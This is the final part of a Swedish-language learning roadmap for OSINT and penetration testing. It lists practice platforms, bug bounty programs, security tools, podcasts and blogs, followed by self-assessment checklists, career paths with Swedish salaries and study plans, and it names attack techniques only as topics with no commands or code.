   Kostnad: Gratis + Premium ($10/mån)
   Nivå: Nybörjare-Advanced
   Innehåll: Guidade paths, CTF-stil challenges
   Bäst för: Strukturerat lärande

2. HackTheBox
   URL: https://www.hackthebox.com
   Kostnad: Gratis + VIP ($14/mån)
   Nivå: Intermediate-Advanced
   Innehåll: Realistiska vulnerable machines
   Bäst för: Praktisk erfarenhet

3. PortSwigger Web Security Academy
   URL: https://portswigger.net/web-security
   Kostnad: Gratis
   Nivå: Alla nivåer
   Innehåll: Interactive labs för web vulnerabilities
   Bäst för: Web application security

4. PentesterLab
   URL: https://pentesterlab.com
   Kostnad: Gratis badge + Pro ($20/mån)
   Nivå: Alla nivåer
   Innehåll: 100+ exercises, web focus
   Bäst för: Web pentesting skills

5. OverTheWire
   URL: https://overthewire.org/wargames/
   Kostnad: Gratis
   Nivå: Nybörjare-Advanced
   Innehåll: Linux, cryptography, web
   Bäst för: Fundamentala skills

6. VulnHub
   URL: https://www.vulnhub.com
   Kostnad: Gratis
   Nivå: Intermediate-Advanced
   Innehåll: Downloadable vulnerable VMs
   Bäst för: Offline practice

7. Root Me
   URL: https://www.root-me.org/
   Kostnad: Gratis
   Nivå: Alla nivåer
   Innehåll: 400+ challenges
   Bäst för: Skill badges och progression
```

#### Bug Bounty Platforms
```
8. HackerOne
   URL: https://www.hackerone.com
   Betalning: Per sårbarhet ($50-$50k+)
   Nivå: Alla (men konkurrens!)
   Bäst för: Stora företagsprogram

9. Bugcrowd
   URL: https://www.bugcrowd.com
   Betalning: Per sårbarhet
   Nivå: Alla
   Bäst för: Bred variation av program

10. Intigriti
    URL: https://www.intigriti.com
    Betalning: Per sårbarhet
    Nivå: Alla
    Bäst för: Europeiska företag

11. YesWeHack
    URL: https://www.yeswehack.com
    Betalning: Per sårbarhet
    Nivå: Alla
    Bäst för: EU GDPR-compliant

12. Synack
    URL: https://www.synack.com
    Betalning: Per sårbarhet (invite-only)
    Nivå: Advanced
    Bäst för: Managed pentesting
```

#### OSINT Verktyg
```
13. Maltego
    URL: https://www.maltego.com
    Kostnad: Gratis CE + Premium ($999/år)
    Användning: Visuell link analysis
    Bäst för: Corporate OSINT

14. SpiderFoot
    URL: https://www.spiderfoot.net
    Kostnad: Open source (gratis)
    Användning: Automatiserad OSINT
    Bäst för: Reconnaissance automation

15. Shodan
    URL: https://www.shodan.io
    Kostnad: Gratis + API ($59)
    Användning: IoT/server search engine
    Bäst för: Finding exposed devices

16. TheHarvester
    URL: GitHub (open source)
    Kostnad: Gratis
    Användning: Email/subdomain enumeration
    Bäst för: Initial recon

17. Recon-ng
    URL: GitHub (open source)
    Kostnad: Gratis
    Användning: Modular OSINT framework
    Bäst för: Automated reconnaissance
```

#### Web Security Testing
```
18. OWASP ZAP
    URL: https://www.zaproxy.org
    Kostnad: Gratis (open source)
    Användning: Web app security scanner
    Bäst för: Active/passive scanning

19. Burp Suite
    URL: https://portswigger.net/burp
    Kostnad: Free Community + Pro ($449/år)
    Användning: Web proxy, scanner, fuzzer
    Bäst för: Professional web pentesting

20. Nikto
    URL: GitHub (open source)
    Kostnad: Gratis
    Användning: Web server scanner
    Bäst för: Quick vulnerability scanning

21. SQLMap
    URL: GitHub (open source)
    Kostnad: Gratis
    Användning: SQL injection automation
    Bäst för: Finding SQLi vulnerabilities
```

#### Network/Infrastructure
```
22. Nmap
    URL: https://nmap.org
    Kostnad: Gratis (open source)
    Användning: Network scanning, port discovery
    Bäst för: Network reconnaissance

23. Metasploit Framework
    URL: https://www.metasploit.com
    Kostnad: Free Community + Pro ($15k+/år)
    Användning: Exploitation framework
    Bäst för: Exploitation, post-exploitation

24. Wireshark
    URL: https://www.wireshark.org
    Kostnad: Gratis (open source)
    Användning: Network protocol analyzer
    Bäst för: Traffic analysis

25. Responder
    URL: GitHub (open source)
    Kostnad: Gratis
    Användning: LLMNR/NBT-NS poisoning
    Bäst för: Internal network attacks
```

---

### 🎙️ Podcasts

```
1. Darknet Diaries
   Host: Jack Rhysider
   Innehåll: True hacking stories
   Längd: ~1 timme/episod
   Frekvens: Varannan vecka
   Varför: Spännande storytelling, lär dig från verkliga fall

2. The Cyberwire Daily
   Host: Dave Bittner
   Innehåll: Dagliga cybersäkerhets-nyheter
   Längd: ~20 min/episod
   Frekvens: Dagligen
   Varför: Håll dig uppdaterad

3. Risky Business
   Host: Patrick Gray
   Innehåll: Säkerhetsnyheter, intervjuer
   Längd: ~1 timme/episod
   Frekvens: Veckovis
   Varför: Djupgående analys

4. Security Now
   Host: Steve Gibson, Leo Laporte
   Innehåll: Säkerhetsteknologi, nyheter
   Längd: ~2 timmar/episod
   Frekvens: Veckovis
   Varför: Tekniskt djup

5. Bug Bounty Podcast
   Host: Fisher
   Innehåll: Bug bounty hunter intervjuer
   Längd: ~1 timme/episod
   Frekvens: Månatligt
   Varför: Lär från top hunters
```

---

### 📝 Bloggar & Nyhetskällor

```
1. PortSwigger Daily Swig
   URL: https://portswigger.net/daily-swig
   Innehåll: Web security nyheter
   Varför: Aktuella sårbarheter och trends

2. Krebs on Security
   URL: https://krebsonsecurity.com
   Författare: Brian Krebs
   Innehåll: Cybercrime investigations
   Varför: Djupgående journalistik

3. Troy Hunt's Blog
   URL: https://www.troyhunt.com
   Författare: Troy Hunt (Have I Been Pwned)
   Innehåll: Data breaches, web security
   Varför: Expert insights

4. Detectify Labs
   URL: https://labs.detectify.com
   Innehåll: Web security research
   Varför: Praktiska tutorials

5. Google Project Zero
   URL: https://googleprojectzero.blogspot.com
   Innehåll: Zero-day research
   Varför: Cutting-edge vulnerability research

6. Hacker News (YCombinator)
   URL: https://news.ycombinator.com
   Innehåll: Tech news, säkerhet
   Varför: Community discussions

7. /r/netsec (Reddit)
   URL: https://reddit.com/r/netsec
   Innehåll: Security research, papers
   Varför: Aktiv community
```

---

### 🐦 Twitter/X - Följ dessa

```
Security Researchers:
- @0xdea - Web security research
- @stokfredrik - Bug bounty hunter (STÖK)
- @nahamsec - Bug bounty, OSINT
- @jhaddix - AppSec, bug bounty
- @thecybermentor - Pentesting education
- @LiveOverflow - Security researcher
- @IppSec - HTB walkthroughs

Platforms:
- @bugcrowd - Bug bounty news
- @hackerone - Bug bounty program
- @OWASP - OWASP updates
- @portswiggerres - Burp Suite, research

OSINT:
- @IntelTechniques - Michael Bazzell
- @Sector035 - OSINT tools
- @SEINTPL - OSINT Poland (global content)
- @Nixintel - OSINT techniques

General:
- @SwiftOnSecurity - Infosec humor + tips
- @troyhunt - Have I Been Pwned
- @GossiTheDog - Security news
```

---

## ✅ Självutvärdering & Checklista

### 📊 Testa dina kunskaper - Nivå för Nivå

#### 🎯 Nivå 1: Introduktion - Självutvärdering

**Kunskap (Teori)**
```
□ Jag kan förklara vad OSINT är med mina egna ord
□ Jag förstår skillnaden mellan passiv och aktiv reconnaissance
□ Jag kan lista minst 5 publika källor för OSINT
□ Jag känner till OWASP Top 10 sårbarheter
□ Jag förstår vad HTTP requests och responses är
□ Jag kan förklara vad en proxy gör
□ Jag vet varför säkerhetstestning är viktigt
□ Jag känner till grundläggande säkerhetstermer (SQLi, XSS, CSRF)

Poäng: ___/8
```

**Praktiska Färdigheter**
```
□ Jag kan använda Google Dorks för att hitta information
□ Jag har använt WHOIS för att slå upp domäner
□ Jag kan navigera i ZAP-gränssnittet
□ Jag har konfigurerat min webbläsare att använda ZAP som proxy
□ Jag kan läsa HTTP requests i ZAP History
□ Jag har genomfört övningarna i Nivå 1

Poäng: ___/6
```

**Redo för Nivå 2?**
```
✅ 12-14 poäng totalt: Ja, fortsätt till Nivå 2!
⚠️  8-11 poäng: Repetera några övningar först
❌ <8 poäng: Gå igenom Nivå 1 igen
```

---

#### 🎯 Nivå 2: Grundläggande ZAP - Självutvärdering

**Kunskap (Teori)**
```
□ Jag kan förklara hur en Passive Scan fungerar
□ Jag förstår skillnaden mellan Passive och Active Scan
□ Jag känner till vanliga HTTP security headers
□ Jag vet vad SQL Injection är och hur det fungerar
□ Jag kan förklara XSS (Reflected, Stored, DOM)
□ Jag förstår vad HTTPS och SSL/TLS gör
□ Jag vet vad en False Positive är
□ Jag känner till ZAP Alerts och deras severity-nivåer

Poäng: ___/8
```

**Praktiska Färdigheter**
```
□ Jag har installerat och konfigurerat DVWA
□ Jag kan köra ZAP Passive Scan
□ Jag kan köra ZAP Active Scan
□ Jag kan använda Repeater för att modifiera requests
□ Jag har hittat en SQL Injection-sårbarhet manuellt
□ Jag har exploaterat en XSS-sårbarhet
□ Jag kan generera en ZAP-rapport (HTML)
□ Jag har slutfört alla övningar i Nivå 2

Poäng: ___/8
```

**Redo för Nivå 3?**
```
✅ 14-16 poäng totalt: Ja, fortsätt till Nivå 3!
⚠️  10-13 poäng: Öva mer på DVWA först
❌ <10 poäng: Repetera Nivå 2
```

---

#### 🎯 Nivå 3: Tekniska Verktyg - Självutvärdering

**Kunskap (Teori)**
```
□ Jag kan förklara hur Maltego fungerar för OSINT
□ Jag förstår olika DNS record-typer (A, MX, NS, TXT)
□ Jag vet vad subdomain enumeration är
□ Jag kan förklara vad Shodan gör och varför det är användbart
□ Jag förstår ZAP Spider (traditional vs AJAX)
□ Jag vet vad Fuzzing är och när man använder det
□ Jag känner till Session Management vulnerabilities
□ Jag kan förklara skillnaden mellan Authentication och Authorization

Poäng: ___/8
```

**Praktiska Färdigheter**
```
□ Jag har använt Maltego för att kartlägga ett företag
□ Jag kan använda theHarvester för email enumeration
□ Jag har använt Shodan för att hitta exponerade devices
□ Jag kan köra ZAP Spider för att kartlägga en webbapp
□ Jag har fuzat ett formulär med olika payloads
□ Jag har testat Session Management (cookies, timeout)
□ Jag kan konfigurera Form-based Authentication i ZAP
□ Jag har hittat och exploaterat XSS manuellt

Poäng: ___/8
```

**Verktyg jag behärskar:**
```
□ Maltego
□ theHarvester
□ Shodan
□ ZAP Spider (Traditional + AJAX)
□ ZAP Fuzzer
□ ZAP Authentication

Poäng: ___/6
```

**Redo för Nivå 4?**
```
✅ 20-22 poäng totalt: Ja, fortsätt till Nivå 4!
⚠️  15-19 poäng: Öva mer på verktygen
❌ <15 poäng: Repetera Nivå 3
```

---

#### 🎯 Nivå 4: Avancerade Tekniker - Självutvärdering

**Kunskap (Teori)**
```
□ Jag förstår Corporate OSINT-metodik
□ Jag kan förklara DNS enumeration-tekniker (dnsenum, dnsrecon)
□ Jag vet hur man använder ZAP API med Python
□ Jag känner till hela OWASP Top 10 i detalj
□ Jag förstår SQL Injection typer (Union, Blind, Time-based)
□ Jag vet vad CSRF är och hur man testar för det
□ Jag känner till XXE (XML External Entity) attacks
□ Jag kan förklara Command Injection
□ Jag vet vad WAF är och hur man kan bypassa det
□ Jag förstår hur man skriver professionella pentesting-rapporter

Poäng: ___/10
```

**Praktiska Färdigheter**
```
□ Jag har genomfört Corporate OSINT på ett företag
□ Jag har använt dnsenum/dnsrecon för DNS enumeration
□ Jag har skrivit Python-scripts som använder ZAP API
□ Jag har hittat och exploaterat SQL Injection med SQLmap
□ Jag har testat för CSRF-sårbarheter
□ Jag har exploaterat XXE
□ Jag har hittat Command Injection
□ Jag har försökt bypassa en WAF
□ Jag har skrivit en professionell penetrationstestningsrapport
□ Jag har genomfört det stora projektet i Nivå 4

Poäng: ___/10
```

**Verktyg jag behärskar:**
```
□ dnsenum / dnsrecon / fierce
□ Amass
□ SQLmap
□ ZAP Python API
□ Burp Suite (grundläggande)
□ Custom Python scripts för automation

Poäng: ___/6
```

**Redo för Nivå 5?**
```
✅ 24-26 poäng totalt: Ja, fortsätt till Nivå 5!
⚠️  18-23 poäng: Öva mer på avancerade tekniker
❌ <18 poäng: Repetera Nivå 4
```

---

#### 🎯 Nivå 5: Expert - Självutvärdering

**Kunskap (Teori)**
```
□ Jag förstår hur AI kan användas för OSINT (NLP, sentiment analysis)
□ Jag känner till cloud security best practices (AWS, Azure, GCP)
□ Jag vet hur man säkrar Docker containers
□ Jag förstår Kubernetes security
□ Jag kan förklara DevSecOps och CI/CD security
□ Jag känner till modern API security (GraphQL, REST, gRPC)
□ Jag vet vad Threat Intelligence är och hur man använder det
□ Jag kan förklara SAST vs DAST
□ Jag förstår Red Team operations
□ Jag vet hur Bug Bounty programs fungerar professionellt

Poäng: ___/10
```

**Praktiska Färdigheter**
```
□ Jag har byggt AI-driven OSINT-verktyg (Twitter analysis, etc.)
□ Jag har genomfört cloud security audit (ScoutSuite/Prowler)
□ Jag har scannat Docker containers för sårbarheter
□ Jag har testat Kubernetes säkerhet
□ Jag har integrerat säkerhetstestning i CI/CD (GitHub Actions)
□ Jag har testat GraphQL APIs för sårbarheter
□ Jag har byggt egna säkerhetsverktyg i Python
□ Jag har genomfört Enterprise Security Assessment (Nivå 5 projekt)
□ Jag har skrivit en fullständig pentesting-rapport
□ Jag har bidragit till bug bounty programs eller rapporterat sårbarheter

Poäng: ___/10
```

**Verktyg jag behärskar:**
```
□ ScoutSuite / Prowler (Cloud security)
□ Trivy / Docker Bench (Container security)
□ Semgrep / Bandit (SAST)
□ GitHub Actions / GitLab CI (Security pipelines)
□ Custom AI/ML OSINT tools
□ Advanced Python scripting för automation
□ Burp Suite Professional-nivå
□ Metasploit Framework

Poäng: ___/8
```

**Expert-nivå uppnådd?**
```
✅ 26-28 poäng totalt: Du är en EXPERT! 🎉
⭐ 22-25 poäng: Nästan där, fortsätt öva!
⚠️  18-21 poäng: Öva mer på expert-tekniker
❌ <18 poäng: Repetera Nivå 5
```

---

### 📋 Fullständig Kompetens-Checklista

#### OSINT Kompetens
```
GRUNDLÄGGANDE
□ Google Dorking
□ WHOIS lookups
□ DNS reconnaissance
□ Social media research
□ Email enumeration

INTERMEDIATE
□ Maltego för visuell analys
□ theHarvester för automation
□ Shodan för IoT reconnaissance
□ Subdomain enumeration
□ SSL certificate transparency

AVANCERAD
□ Corporate OSINT metodologi
□ Competitive intelligence
□ GitHub intelligence
□ Technology stack discovery
□ Data leak discovery

EXPERT
□ AI-driven social media analysis
□ Image recognition OSINT
□ Threat intelligence integration
□ MISP platform användning
□ Automated OSINT pipelines
```

#### Web Application Security
```
GRUNDLÄGGANDE
□ HTTP/HTTPS förståelse
□ Proxy användning (ZAP/Burp)
□ Passive scanning
□ Security headers
□ Cookie security

INTERMEDIATE
□ Active scanning
□ SQL Injection (basic)
□ XSS (Reflected, Stored)
□ CSRF testing
□ Manual request manipulation

AVANCERAD
□ Advanced SQL Injection (Union, Blind)
□ XXE attacks
□ Command Injection
□ File inclusion vulnerabilities
□ Session hijacking
□ Authentication bypass
□ WAF bypass techniques

EXPERT
□ GraphQL security testing
□ REST API advanced testing
□ gRPC security
□ Business logic vulnerabilities
□ Advanced fuzzing techniques
□ Zero-day discovery
```

#### Penetration Testing
```
GRUNDLÄGGANDE
□ Reconnaissance metodologi
□ Port scanning
□ Service enumeration
□ Vulnerability identification
□ Basic exploitation

INTERMEDIATE
□ Web application pentesting
□ Network penetration testing
□ Password cracking
□ Privilege escalation (basic)
□ Post-exploitation (basic)

AVANCERAD
□ Full penetration testing methodology
□ Advanced exploitation
□ Pivoting and lateral movement
□ Active Directory attacks
□ Report writing

EXPERT
□ Red Team operations
□ Advanced persistent threats (APT) simulation
□ Social engineering campaigns
□ Physical security testing
□ Full security audit (enterprise-level)
```

#### Automation & Scripting
```
GRUNDLÄGGANDE
□ Bash basics
□ Python basics
□ Kan köra färdiga scripts
□ Kan modifiera enkla scripts

INTERMEDIATE
□ Python för säkerhet
□ API integration
□ Web scraping
□ Automation av repetitiva uppgifter

AVANCERAD
□ Custom OSINT tools
□ ZAP API automation
□ Complex Python scripts
□ Multi-threading

EXPERT
□ AI/ML integration
□ Full automation pipelines
□ Custom frameworks
□ Tool development
```

#### Cloud & DevSecOps
```
GRUNDLÄGGANDE
□ Cloud basics (AWS/Azure/GCP)
□ Container concepts (Docker)
□ CI/CD förståelse

INTERMEDIATE
□ Cloud security basics
□ Docker security
□ Basic SAST/DAST

AVANCERAD
□ Cloud security auditing
□ Kubernetes security
□ CI/CD security integration
□ Infrastructure as Code security

EXPERT
□ Full DevSecOps implementation
□ Cloud native security
□ Container orchestration security
□ Security automation pipelines
```

---

### 🎯 Karriärväg baserat på kompetens

```
EFTER NIVÅ 1-2: Entry Level
═══════════════════════════════════════════════════════════
Roller:
- Junior Security Analyst
- SOC Analyst (Level 1)
- IT Security Trainee

Lön (Sverige): 350k - 450k SEK/år
Nästa steg: Nivå 3 + praktisk erfarenhet


EFTER NIVÅ 3-4: Intermediate Level
═══════════════════════════════════════════════════════════
Roller:
- Security Analyst
- Penetration Tester (Junior)
- Application Security Engineer
- Bug Bounty Hunter (part-time)

Lön (Sverige): 450k - 600k SEK/år
Nästa steg: Certifieringar (CEH, OSCP) + Nivå 5


EFTER NIVÅ 5: Expert Level
═══════════════════════════════════════════════════════════
Roller:
- Senior Penetration Tester
- Security Consultant
- Red Team Operator
- Application Security Lead
- Bug Bounty Hunter (full-time)
- Security Researcher

Lön (Sverige): 600k - 900k SEK/år
Nästa steg: Specialisering, management, eller egen konsultverksamhet


LÅNGSIKTIG (5-10 år erfarenhet)
═══════════════════════════════════════════════════════════
Roller:
- Security Architect
- CISO (Chief Information Security Officer)
- Security Research Lead
- Principal Security Engineer
- Independent Consultant

Lön (Sverige): 800k - 1,500k+ SEK/år
```

---

### 📊 Färdighetsmatris - Var står du?

**Markera din nivå för varje kategori:**

```
Kategori                  | Nivå 1 | Nivå 2 | Nivå 3 | Nivå 4 | Nivå 5
────────────────────────────────────────────────────────────────────────
OSINT                     |   □    |   □    |   □    |   □    |   □
Web Security              |   □    |   □    |   □    |   □    |   □
Penetration Testing       |   □    |   □    |   □    |   □    |   □
Python/Scripting          |   □    |   □    |   □    |   □    |   □
Network Security          |   □    |   □    |   □    |   □    |   □
Cloud Security            |   □    |   □    |   □    |   □    |   □
DevSecOps                 |   □    |   □    |   □    |   □    |   □
Report Writing            |   □    |   □    |   □    |   □    |   □
Tool Development          |   □    |   □    |   □    |   □    |   □
Business Understanding    |   □    |   □    |   □    |   □    |   □


TOLKNING:
─────────────────────────────────────────────────────────────
• Mestadels Nivå 1-2: Nybörjare - fortsätt lära grunderna
• Mestadels Nivå 3: Intermediate - redo för professionell roll
• Mestadels Nivå 4: Avancerad - redo för senior-roller
• Mestadels Nivå 5: Expert - branschledande kompetens
```

---

### 🎓 Rekommenderad Studieplan

#### 📅 4-Veckorsprogram (Intensivt)

```
VECKA 1: Nivå 1 + 2
──────────────────────────────────────────────────────────
Mån-Fre: 3-4 timmar/dag
Helg:    4-6 timmar/dag
Total:   ~20 timmar

Fokus:
- OSINT grunderna
- ZAP installation och konfiguration
- DVWA setup
- Grundläggande sårbarheter (SQLi, XSS)

VECKA 2: Nivå 3
──────────────────────────────────────────────────────────
Mån-Fre: 3-4 timmar/dag
Helg:    4-6 timmar/dag
Total:   ~20 timmar

Fokus:
- Maltego, theHarvester, Shodan
- ZAP Spider och Fuzzing
- Session management
- Authentication testing

VECKA 3: Nivå 4
──────────────────────────────────────────────────────────
Mån-Fre: 3-4 timmar/dag
Helg:    6-8 timmar/dag
Total:   ~25 timmar

Fokus:
- Corporate OSINT
- DNS enumeration
- Python automation
- OWASP Top 10 i detalj
- Report writing

VECKA 4: Nivå 5 + Projekt
──────────────────────────────────────────────────────────
Mån-Fre: 4-5 timmar/dag
Helg:    8-10 timmar/dag
Total:   ~35 timmar

Fokus:
- AI-driven OSINT
- Cloud security
- DevSecOps
- Enterprise Security Assessment (projekt)
```

#### 📅 8-Veckorsprogram (Rekommenderat)

```
VECKA 1-2: Nivå 1 + 2
Total: ~25 timmar (2-3 tim/dag)

VECKA 3-4: Nivå 3
Total: ~25 timmar (2-3 tim/dag)

VECKA 5-6: Nivå 4
Total: ~30 timmar (3-4 tim/dag)

VECKA 7-8: Nivå 5 + Projekt
Total: ~40 timmar (4-5 tim/dag)
```

#### 📅 6-Månadersprogram (I din egen takt)

```
MÅNAD 1: Nivå 1 + 2
Total: ~15-20 timmar

MÅNAD 2: Nivå 3
Total: ~15-20 timmar

MÅNAD 3: Nivå 4
Total: ~20-25 timmar

MÅNAD 4: Nivå 5
Total: ~25-30 timmar

MÅNAD 5-6: Praktik och fördjupning
- TryHackMe / HackTheBox
- Bug bounty (start)
- Egen projekt
- Certifieringsförberedelse
```

---

### ✅ Slutlig Checklista - Är du redo för professionell säkerhetsroll?

```
TEKNISKA FÄRDIGHETER
□ Jag kan genomföra fullständig OSINT på ett företag
□ Jag kan hitta och exploatera OWASP Top 10 sårbarheter
□ Jag kan skriva Python-scripts för automation
□ Jag kan genomföra web application penetration test
□ Jag kan använda Burp Suite eller ZAP professionellt
□ Jag kan skriva professionella säkerhetsrapporter
□ Jag förstår cloud security (AWS/Azure/GCP)
□ Jag kan integrera security i CI/CD pipelines

MJUKA FÄRDIGHETER
□ Jag kan kommunicera tekniska fynd till icke-teknisk publik
□ Jag kan prioritera sårbarheter baserat på business impact
□ Jag förstår risk management
□ Jag kan arbeta självständigt och i team
□ Jag håller mig uppdaterad med senaste sårbarheter och trends

ERFARENHET
□ Jag har genomfört minst 10 praktiska övningar/CTF
□ Jag har skrivit minst 3 fullständiga pentesting-rapporter
□ Jag har rapporterat minst 1 verklig sårbarhet (bug bounty eller responsible disclosure)
□ Jag har ett GitHub med säkerhetsprojekt/scripts
□ Jag kan visa upp en portfolio av mitt arbete

CERTIFIERINGAR (Valfritt men rekommenderat)
□ CEH / OSCP / eJPT eller liknande
□ Eller dokumenterad motsvarande erfarenhet

SCORE:
──────────────────────────────────────────────
20-24: Du är redo för professionell roll! 🎉
15-19: Nästan där, fortsätt öva några månader
10-14: Bygg mer praktisk erfarenhet
<10:   Fortsätt studera och öva
```

---

## 🎉 Grattis!

Om du har kommit hit har du tillgång till en komplett roadmap för att bli expert inom OSINT och penetrationstestning!

### 🚀 Nästa Steg:

1. **Börja med Nivå 1** - Hoppa inte över grunderna!
2. **Gör alla övningar** - Teori utan praktik är värdelöst
3. **Dokumentera din resa** - Bygg portfolio på GitHub
4. **Engagera dig i communityn** - Twitter, Reddit, Discord
5. **Fortsätt lära** - Säkerhet utvecklas ständigt
6. **Ge tillbaka** - Hjälp andra som lär sig

### 📬 Feedback och Frågor

Denna guide är en levande resurs! Om du har:
- ✅ Förbättringsförslag
- ✅ Hittat fel
- ✅ Vill bidra med innehåll
- ✅ Har frågor

Kontakta maintainers via GitHub issues eller community-forum!

---

**Lycka till på din resa mot att bli säkerhetsexpert! 🔐**

*"The only way to learn hacking is by hacking." - Anonymous*

---

**[🏠 Tillbaka till Översikt](OSINT_ZAP_Guide_README.md)**

---

**© 2024 | Skapad för utbildningsändamål | Använd alltid etiskt och lagligt**
